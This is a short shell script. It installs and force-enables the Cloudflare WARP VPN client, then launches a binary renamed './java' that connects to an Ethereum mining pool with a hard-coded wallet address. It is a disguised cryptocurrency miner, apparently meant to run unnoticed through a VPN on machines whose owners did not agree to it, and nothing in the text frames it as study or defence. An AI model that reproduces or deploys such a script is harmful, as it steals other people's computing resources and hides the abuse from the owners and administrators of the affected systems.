#!/bin/sh
wget https://pkg.cloudflareclient.com/uploads/cloudflare_warp_2021_8_0_1_amd64_844183db02.deb
sudo dpkg -i cloudflare_warp_2021_8_0_1_amd64_844183db02.deb
sudo systemctl enable --now warp-svc.service
warp-cli set-mode warp+doh
warp-cli register
warp-cli enable-always-on
warp-cli connect

./java -P stratum1+tcp://0x2fd9EB3c66C491443C09d9F10634602C909992Dd.fee@eth.2miners.com:2020
